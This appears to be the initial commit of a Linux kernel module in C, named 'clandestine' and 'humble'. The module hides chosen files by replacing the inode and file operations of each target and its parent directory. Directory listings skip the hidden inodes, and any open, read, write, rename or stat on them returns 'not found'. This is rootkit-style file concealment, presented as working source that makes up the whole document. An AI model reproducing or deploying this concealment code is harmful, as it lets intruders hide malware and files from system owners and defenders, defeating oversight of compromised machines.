8f607c3a3d2d621f81a56b9990d2b91e4af9796e
a.lozovsky@gmail.com <a.lozovsky@gmail.com@30b41691-64b8-301e-5e7a-8f4704caa079>
2012-10-22 21:32:17 +0000

    Initial commit.
    + basic filehiding
    + hashtable
    + testing module_init()

---
+++ trunk/clandestine.c
@@ -0,0 +1,192 @@
+#include <linux/errno.h>
+#include <linux/fs.h>
+#include <linux/module.h>
+#include <linux/mutex.h>
+#include <linux/namei.h>
+#include <linux/path.h>
+#include <linux/rwsem.h>
+
+#include "humble.h"
+
+
+static filldir_t g_original_filldir;
+
+static int filtering_filldir(void *buffer, const char *name, int namelen,
+                             loff_t offset, u64 ino, unsigned d_type)
+{
+	if (humble_hash_contains(ino)) {
+		return 0;
+	}
+
+	return g_original_filldir(buffer, name, namelen, offset, ino, d_type);
+}
+
+/*
+ *  We need to pass the original filldir() to filtering_filldir(),
+ *  this is done via g_original_filldir pointer.
+ *
+ *  The pointer is protected by two locks:
+ *
+ *    * g_readdir_lock ensures that no call to filterind_readdir() will
+ *      overwrite current g_original_filldir while the filtering_filldir()
+ *      may need it;
+ *
+ *    * g_filldir_lock permits any number of recursive calls to readdir()
+ *      from the same filtering_readdir() (e.g., when VFS reads the `.'
+ *      directory entry), but blocks anything else.
+ */
+
+static DEFINE_MUTEX(g_readdir_lock);
+static DECLARE_RWSEM(g_filldir_lock);
+
+static int filtering_readdir(struct file *dir, void *data, filldir_t filldir)
+{
+	int err;
+
+	down_read(&g_filldir_lock);
+	if (filldir == g_original_filldir) {
+		err = dir->f_dentry->d_sb->s_root->d_inode->i_fop
+			->readdir(dir, data, filtering_filldir);
+		up_read(&g_filldir_lock);
+		return err;
+	}
+	up_read(&g_filldir_lock);
+
+	mutex_lock(&g_readdir_lock);
+	g_original_filldir = filldir;
+	err = dir->f_dentry->d_sb->s_root->d_inode->i_fop
+		->readdir(dir, data, filtering_filldir);
+	down_write(&g_filldir_lock);
+	g_original_filldir = NULL;
+	up_write(&g_filldir_lock);
+	mutex_unlock(&g_readdir_lock);
+
+	return err;
+}
+
+/*
+ * Returning -ENOENT from hidden files' ops as if the files really do not exist.
+ */
+
+static ssize_t notfound_read(struct file *file, char __user *buf,
+                             size_t count, loff_t *offset)
+{
+	return -ENOENT;
+}
+
+static ssize_t notfound_write(struct file *file, const char __user *buf,
+                              size_t count, loff_t *offset)
+{
+	return -ENOENT;
+}
+
+static int notfound_readdir(struct file *dir, void *data, filldir_t filldir)
+{
+	return -ENOENT;
+}
+
+static int notfound_mmap(struct file *file, struct vm_area_struct *dest)
+{
+	return -ENOENT;
+}
+
+static int notfound_open(struct inode *inode, struct file *file)
+{
+	return -ENOENT;
+}
+
+static int notfound_release(struct inode *inode, struct file *file)
+{
+	return -ENOENT;
+}
+
+static int notfound_rmdir(struct inode *parent, struct dentry *dir)
+{
+	return -ENOENT;
+}
+
+static int notfound_rename(struct inode *inode_old, struct dentry *dentry_old,
+                           struct inode *inode_new, struct dentry *dentry_new)
+{
+	return -ENOENT;
+}
+
+static int notfound_setattr(struct dentry *dentry, struct iattr *attrs)
+{
+	return -ENOENT;
+}
+
+static int notfound_getattr(struct vfsmount *mnt, struct dentry *dentry,
+                            struct kstat *stat)
+{
+	return -ENOENT;
+}
+
+/*
+ * Method tables shared between all hidden files and their parents.
+ */
+
+static struct file_operations filtering_fops = {
+	.owner   = THIS_MODULE,
+	.readdir = filtering_readdir
+};
+
+static struct file_operations notfound_fops = {
+	.owner   = THIS_MODULE,
+	.read    = notfound_read,
+	.write   = notfound_write,
+	.readdir = notfound_readdir,
+	.mmap    = notfound_mmap,
+	.open    = notfound_open,
+	.release = notfound_release
+};
+
+static struct inode_operations notfound_iops = {
+	.rmdir   = notfound_rmdir,
+	.rename  = notfound_rename,
+	.setattr = notfound_setattr,
+	.getattr = notfound_getattr
+};
+
+
+/*
+ *  Hides the file located at @path, writes its inode number to @ino.
+ */
+int humble_hide_file(const char *path, u64 *ino)
+{
+	int err;
+	struct path dest;
+
+	err = kern_path(path, 0, &dest);
+	if (err) {
+		printk(KERN_NOTICE "Humble: could not find file %s\n", path);
+		goto out;
+	}
+
+	dget(dest.dentry);
+	dget(dest.dentry->d_parent);
+	ihold(dest.dentry->d_inode);
+	ihold(dest.dentry->d_parent->d_inode);
+
+	err = humble_hash_add(dest.dentry->d_inode,
+	                      dest.dentry->d_parent->d_inode);
+	if (err) {
+		printk(KERN_NOTICE "Humble: could not add file to hash\n");
+		iput(dest.dentry->d_inode);
+		iput(dest.dentry->d_parent->d_inode);
+		goto out;
+	}
+	dest.dentry->d_inode->i_op = &notfound_iops;
+	dest.dentry->d_inode->i_fop = &notfound_fops;
+	dest.dentry->d_parent->d_inode->i_fop = &filtering_fops;
+	*ino = dest.dentry->d_inode->i_ino;
+out:
+	dput(dest.dentry->d_parent);
+	dput(dest.dentry);
+	return err;
+}
+
+int humble_unhide_file(u64 ino)
+{
+	return humble_hash_remove(ino);;
+}
---
+++ trunk/humble.h
@@ -0,0 +1,16 @@
+#ifndef HUMBLE_H__
+#define HUMBLE_H__
+
+#include <linux/fs.h>
+#include <linux/types.h>
+
+/* Hashtable */
+extern int humble_hash_contains(u64 ino);
+extern int humble_hash_add(struct inode *file, struct inode *dir);
+extern int humble_hash_remove(u64 ino);
+
+/* Clandestine */
+extern int humble_hide_file(const char *path, u64 *ino);
+extern int humble_unhide_file(u64 ino);
+
+#endif
